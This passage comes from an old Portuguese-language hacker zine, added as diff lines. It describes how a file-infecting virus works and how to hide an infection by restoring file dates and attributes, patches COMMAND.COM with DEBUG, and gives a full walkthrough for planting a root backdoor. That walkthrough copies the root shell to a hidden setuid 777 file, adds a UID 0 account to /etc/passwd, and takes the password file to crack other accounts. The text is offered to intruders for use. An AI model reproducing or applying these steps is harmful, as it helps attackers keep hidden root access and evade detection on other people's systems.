+tipo de hospedagem mais usado é:
+
+.---------+---------.
+|  Virus  | Arquivo |
+'---------+---------'
+
+	Copiamos o Virus para o inicio do Arquivo, então quando for executa-
+do o arquivo, o virus será executado antes.
+
+[[[[[ INFECTAÇÃO ]]]]]
+
+	Okz, O víruz está hospedado. Agora o que ele tem que fazer é infectar
+outros arquivos. Para isso ele deve seguir estes passos:
+
+1. Encontrar um arquivo para infectar;
+2. Checar se ele já está infectado;
+3. Se estiver, volta para o passo 1;
+4. Infectar ele;
+5. Se já infectou arquivos o suficiente, sai;
+6. Se não volta pro passo 1.
+
+[[[[[ ENCOBRINDO A INFECTAÇÃO ]]]]]
+
+	Quando for infectar o arquivo tenha certeza de que os dados(tipo data
+/hora, atributo, ...) tenham sido recuperados.  Para que isso seja feito os
+passos que o virus deve seguir são estes:
+
+1. Salve os atributos e mude-os para nada;
+2. Salvar Data/Hora do arquivo;
+3. Fechar o arquivo;
+4. Abrir o arquivo em modo Read/Write;
+5. Copie P1 para o fim do arquivo;
+6. Copie V1 no lugar do P1 original;
+7. Copie V2 para o final do arquivo;
+8. Restaure os atributos e data/hora do arquivo.
+
+----------Fim-da-parte-1-----------------------------------------------------
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 8. Crackerz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Vamos aprender a mexer no nosso COMMAND.COM ???
+	Vamos!!!!!
+	Isso não é D+??
+	Tá, tá! Chega de emosão. Nós utilizaremos o programa debug para isso.
+	Primeiro, para não me encherem o saco se fizerem besteira,  vamos co-
+piar o command.com para qquer outro dir (Nem para a raiz nem pro \WINDOWS) .
+Siga os meus passos:
+
+C:\> md teste
+C:\> copy command.com \teste
+C:\> cd \teste
+C:\TESTE\> dir /b
+command.com
+
+C:\TESTE\>
+
+	Agora vamos rodar o debugar ele:
+
+C:\TESTE\> debug command.com
+
+	Bem. A primeira coisa que faremos será modificar o comando copy. Para
+isso, antes teremos que achar o comando copy no COMMAND.COM(Clarou). Digite:
+
+-s 100 ffff "COPY"
+
+	Note que "COPY" deve ser escrito em maiusculas. Após isso aparecerão
+algumas linhas como:
+
+2486:cab1
+2486:cc63
+
+	Essas são as linhas onde se encontram a palavra COPY.
+	Agora digite:
+
+-d cab1
+
+	Isso demonstrará o conteudo da linha 2486:cab1, se for umas coisas
+tipo: COPY.PAUSE.DATE.TIME.VER.VOL... ; isso é o coração do MSDOS.
+	Se o seu MSDOS não for versão 4.00 as linhas exibidas poderam ser ou-
+tras. Aí é só digitar d + a segunda parte(depois dos ":" ) da linha exibida
+no comando s 100 ffff "COPY" e ver se encontra as linhas exibidas acima. Ex:
+
+-s 100 ffff "COPY"
+1D74:8ED7
+1D74:B11B
+1D74:D8DB
+
+-d 8ed7
+1D74:8ED7     43 4F 50 59 05 50 41-55 53 45 04 44 41 54 45    COPY.PAUSE.DATE
+....
+
+	Tá bom... Vamos mudar o nome do comando COPY para TEST. Sigua este ex
+levando em conta que a palavra "COPY" está em 2486:cab1.
+
+-d cab1
+2486:CAB1     43 4F 50 59 05 50 41-55 53 45 04 44 41 54 45    COPY.PAUSE.DATE
+....					       { Note o nome: ^^^^ }
+
+-e cab1
+2486:CAB1    43.		{ Aki digite 54(equivale a letra T)}
+-
+-d cab1
+2486:CAB1     54 4F 50 59 05 50 41-55 53 45 04 44 41 54 45    TOPY.PAUSE.DATE
+....				  { Note que COPY mudou para: ^^^^ }
+
+-e cab2					{cab2 equivale a segunda letra}
+2486:CAB2    4F.		{ Aki digite 45(equivale a letra E)}
+-e cab3
+2486:CAB3    50.		{ Aki digite 53(equivale a letra S)}
+-e cab4
+2486:CAB4    59.		{ Aki digite 54 }
+-d cab1
+2486:CAB1     54 45 53 54 05 50 41-55 53 45 04 44 41 54 45    TEST.PAUSE.DATE
+....					{ note q COPY agora é ^^^^ }
+
+-w					{ para salvar }
+Gravando 17306 bytes
+
+	Prontinho.
+	Porém eu descobri que em umas versões do MSDOS contém uma proteção
+anti-crack que modificam algumas linhas da sua fonte. Mas isso não é nenhum
+grande problema para os Crackerz esperientes.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 9. Hack, the Art $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Este truque jah foi visto em muitos lugares. Mas vale apena mostra-lo
+de novo para os Begginers que ainda não o conhecem.
+	O truque consiste em fazer uma backdoor usando o shell.
+	Backdoor não passa de uma porta dos fundos para o invasor. Se você
+hackeia um sistema, e tah afim de voltar lah a qualquer hora denovo como root
+vc só precisa colocar uma boa backdoor q lhe dê nível de root e pronto.
+	Essas são 2 bem simples jah conhecidas pelo pessoal entendido.
+	Assim:
+
+1. Você entra como root no sistema.
+2. O sistema informa o seu UID e GID para a shell.
+
+	Isso é o que acontece quando você entra em um sistema (não somente
+como root). Então vc faz o seguinte:
+
+3. Edite o passwd.
+4. Localize a conta do root que vc usou e veja qual é a sua shell(normalmente
+   é sh ou bash).
+5. Crie um diretório qquer no seu homedir(No seu, não no do root).
+   Se vc não tiver, crie um no /usr, tipo /usr/struck.
+6. Copie o shell do root para este diretório.
+7. Deixe ele como oculto(com um . na frente).
+8. Mude o modo dele para 777 e u+s.
+9. Saia. Claro que antes Pegue o /etc/passwd se ainda não tiver feito.
+10. Agora use a sua conta para acessar o sistema, se não tiver descripte o
+    arquivo passwd e use qquer outra conta.
+11. Vá ao dir que vc criou.
+12. Execute o shell apartir desse diretório e PIMBA NA GORDUCHINHA!
+
+	O que ?? Eu fui muito rapido e vc não conseguiu me acompanhar ?? Não
+seja por isso, apenas faça o que eu digo e faça o que eu faço :)
+
+Login : root
+Password :
+
+# ls
+etc	bin	dev	usr	pub
+# cd etc
+# cat passwd | grep root:
+root:x:0:0:SysAdmin:/:/bin/sh
+# cd /usr/eu
+# md /myfiles
+# cp /bin/sh /usr/eu/myfiles
+# cd myfiles
+# ls
+sh
+# mv sh .sh
+# chmod 777 .sh
+# chmod u+s .sh
+# logout
+
+	Agora vc entra com a sua conta.
+
+Login : eu
+Password :
+
+$ pwd
+/usr/eu
+$ cd myfiles
+$ ls
+$ ls -la
+-rwsrwxrwx   1 root     root       301580 May 19 20:30 .sh
+$ ./.sh
+#
+# id
+UID = 0(root) GID = 0 (root)
+#
+
+	Ficou fácil?? Note que aki o login do root é "root" e o seu é "eu".
+	Outra backdoor ainda mais fácil é essa:
+
+1. Edite o /etc/passwd
+2. Adicione uma conta com UID =0 e GID = 0
+
+	Essa é moleza, porém as chances de você não ser pego são minimas. Use
+em redes grandes(com bastantes users).
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 10. Preview $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Na próxima edição...
+
+* Phreaking			'Ultimos comandos para o TESTMODE;
+* Hacking para iniciantes	'Comandos exenciais p/ hackear;
+* Programação			'Talvéz um tutorial de C ou pascal(TALVÉZ);
+* VIRII				'Mais infos sobre Virus;
+* Invasão de privacidade	'Invadindo por ICQ;
+* Hack, the Art			'Mais backdoor's;
+* ¡Bonus!			'Portas do TCP/IP em constante uso
+				'ou
+				'URL's de FTP/TELNET.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ ¡BONUS! $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	-=-=-=TOP10=-=-=-
+	Os melhores materiais hacks brasileiros, encontrados na inet.
+
+1. Zine Axur05
+2. Zine Hack n' Phreak
+3. Mask's HomePage v.II ( www.geocities.com/SiliconValley/Lab/2250 )
+4. Hack n' Phreak HomePage ( www.geocities.com/SiliconValley/Peaks/1292 )
+5. Zine Near(z)
+6. Zine UHF
+7. UHF Home page ( www.uhf.base.org )
+8. Zine RWX
+9. Zine Quebra de Sigilo
+10. Anti-Hacker's HomePage ( http://www.netgate.com.br/~hacker/index.htm )
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+                FFFFFFFFFFFF  IIII  NNNN        NNN
+                FFFFFFFFFFFF  IIII  NNNNNN      NNN
+                FFFF                NNN NNN     NNN
+                FFFF          IIII  NNN  NNN    NNN
+                FFFFFFFFFFFF  IIII  NNN   NNN   NNN
+                FFFFFFFFFFFF  IIII  NNN    NNN  NNN
+                FFFF          IIII  NNN     NNN NNN
+                FFFF          IIII  NNN      NNNNNN
+                FFFF          IIII  NNN       NNNNN
+                FFFF          IIII  NNN        NNNN
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Este zine é escrito por Cheat Struck.
+No e-mail;
+No page;
+No ICQ;
+No IP fixed, IP spoofed;
+A unica maneira de me acharem na inet é:
+server  irc.via-rs.com.br:6667
+canais  #via-rs
+        #hackers
+        #senhas
+	#UKE
+	#CSCHANNEL (canal fundado recentemente por mim, nem sempre no ar)
+Quando
+	Sextas e Sabados(raramente) das 12:00 as 6:00
